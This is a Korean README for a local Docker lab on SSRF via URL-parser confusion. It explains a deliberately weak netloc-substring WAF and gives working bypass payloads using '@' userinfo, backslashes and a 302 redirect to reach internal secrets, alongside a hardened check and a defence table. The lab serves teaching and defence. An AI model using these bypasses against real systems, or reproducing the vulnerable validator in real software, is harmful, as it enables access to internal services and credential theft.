# ssrf-url-parser-confusion

> 블로그 글 실습 환경 레포지토리  
> 관련 글 → [7rueb1rd.tistory.com](https://7rueb1rd.tistory.com/44)

---

## 디렉터리 구조

```
.
├── docker-compose.yml       # 전체 실습 환경 정의
├── Dockerfile.target        # 취약한 타깃 앱 이미지
├── app/
│   ├── vuln_app.py          # 취약한 Flask 앱 소스
│   └── templates/
│       └── index.html       # 웹 UI
└── README.md
```

---

## 환경 요구사항

| 항목 | 버전 |
|------|------|
| Docker | 24.0 이상 |
| Docker Compose | v2 이상 (`docker compose` 명령) |
| OS | Linux / macOS / Windows(WSL2) |

---

## 빠른 시작

```bash
# 1. 레포 클론
git clone https://github.com/Truebird0109/sec-lab.git
cd sec-lab/ssrf-url-parser-confusion

# 2. 빌드 & 실행
docker compose up -d --build

# 3. 브라우저에서 접속
# http://localhost:5000
```

---

## 컨테이너 구성

```
[외부 / 내 브라우저]
        │
        ▼ :5000
  ┌─────────────┐
  │   target    │  ← 취약한 Flask 앱 (공격 대상)
  └──────┬──────┘
         │ internal 네트워크
         ├──────────────────────────────┐
         ▼                              ▼
  ┌──────────────┐              ┌──────────────────────┐
  │ internal-api │              │ attacker-redirector  │
  │   :8080      │              │   :9000              │
  │ (외부 직접   │              │ (302 → internal-api) │
  │  접근 불가)  │              └──────────────────────┘
  └──────────────┘
```

| 컨테이너 | 포트 | 역할 |
|---|---|---|
| `target` | 5000 | 취약한 Flask 앱. 공격 대상 |
| `internal-api` | 8080 (내부만) | 외부에서 직접 접근 불가한 비밀 서비스 |
| `attacker-redirector` | 9000 | 302로 internal-api로 리다이렉트하는 공격자 서버 시뮬레이션 |

---

## 취약점 원리

### `is_safe_weak` — 취약한 WAF 패턴

```python
def is_safe_weak(url: str) -> bool:
    parsed = urlparse(url)
    domain = parsed.netloc          # @ · \ 포함한 전체 문자열
    return any(d in domain for d in ALLOWED_DOMAINS)  # "포함" 여부만 확인
```

`urlparse().netloc`은 `userinfo@host:port` 전체를 반환합니다.  
`in` 검사만 하면 netloc 어딘가에 허용 도메인이 있기만 해도 통과되므로 `@`, `\` 트릭으로 우회됩니다.

### `is_safe_strong` — 안전한 패턴

```python
host = parsed.hostname   # @ 이후 실제 호스트만 추출
```

- `hostname`은 userinfo를 제거한 실제 호스트만 반환
- 백슬래시 명시 차단
- DNS 해석 후 사설 IP 대역 차단
- `allow_redirects=False`

---

## 실습

브라우저에서 **http://localhost:5000** 을 열고 아래 실습을 진행합니다.  
상단 토글로 `/fetch-weak` / `/fetch-strong` 엔드포인트를 선택할 수 있습니다.

---

### 기본 동작 확인

`/fetch-weak` 선택 후 아래 URL을 입력하고 **Fetch** 클릭.

| 입력 URL | 예상 결과 |
|---|---|
| `http://evil.com/` | `{"error": "Blocked by WAF"}` — 허용 도메인 아님 |
| `https://images.example.com/` | 연결 오류 — 허용은 됐지만 실제 DNS 없음 |

---

### 실습 1 — `@` (Userinfo) Parser Confusion

WAF는 `netloc` 전체 문자열에서 `images.example.com`을 발견하고 통과시키지만,  
`requests`는 `@` 뒤의 실제 호스트로 접속합니다.

```
http://images.example.com@localhost:5000/internal-secret
              │                   │
       WAF가 보는 값      requests가 실제로 접속하는 곳
```

**실습 방법**

1. `/fetch-weak` 선택
2. URL 입력창에 아래 값 입력
3. **Fetch** 클릭

```
http://images.example.com@localhost:5000/internal-secret
```

**예상 결과**

```json
{"status": 200, "body": "{\"aws_access_key\": \"AKIAIOSFODNN7EXAMPLE\", ...}"}
```

`/internal-secret` 의 민감 데이터가 노출되면 성공입니다.

---

### 실습 2 — `\` (백슬래시) Parser Confusion

`urlparse`는 `\`를 경로 구분자로 보지 않아 netloc 전체에 포함시키지만,  
urllib3는 `\` 앞까지만 호스트로 파싱합니다.

**실습 방법**

1. `/fetch-weak` 선택
2. URL 입력창에 아래 값 입력
3. **Fetch** 클릭

```
http://images.example.com\localhost:5000/internal-secret
```

> 실습 환경에서는 `images.example.com`의 실제 DNS가 없어 연결 오류가 발생합니다.  
> 실전에서는 자신이 소유한 도메인을 `images.example.com` 자리에 사용합니다.

---

### 실습 3 — 302 리다이렉트 우회

`fetch-weak`는 `allow_redirects=True`(기본값)라서 302 응답을 자동으로 추적합니다.  
WAF는 최초 URL만 검사하므로 리다이렉트 목적지는 검사하지 않습니다.

```
요청 → attacker-redirector:9000
         └→ 302 Location: http://internal-api:8080/
              └→ target이 자동 추적 → 내부 데이터 반환
```

**실습 방법**

1. `/fetch-weak` 선택
2. URL 입력창에 아래 값 입력 (`@` 트릭으로 WAF 우회 + 리다이렉터 경유)
3. **Fetch** 클릭

```
http://images.example.com@attacker-redirector:9000/
```

**예상 결과**

```json
{"status": 200, "body": "{\"access\": \"INTERNAL_ONLY\", \"db_password\": \"sup3r_s3cr3t_pw\", ...}"}
```

---

### 안전한 엔드포인트와 비교

`/fetch-strong` 으로 토글을 바꾼 뒤 같은 페이로드를 입력하면 전부 차단됩니다.

| 입력 URL | 예상 결과 |
|---|---|
| `http://images.example.com@localhost:5000/internal-secret` | `{"error": "Blocked by WAF"}` |
| `http://images.example.com@attacker-redirector:9000/` | `{"error": "Blocked by WAF"}` |

---

## 방어 포인트 정리

| 취약 패턴 | 안전 패턴 |
|---|---|
| `urlparse().netloc` + `in` 검사 | `urlparse().hostname` 사용 |
| 백슬래시 미처리 | `"\\" in url` 명시 차단 |
| `allow_redirects=True` | `allow_redirects=False` |
| 도메인 문자열 비교만 | DNS 해석 후 사설 IP 대역 차단 |

---

## 실습 후 정리

```bash
docker compose down
```

---

## 주의사항

이 레포의 모든 코드는 **로컬 실습 전용**입니다.  
허가받지 않은 외부 시스템에 사용하는 것은 불법이며, 모든 책임은 사용자에게 있습니다.
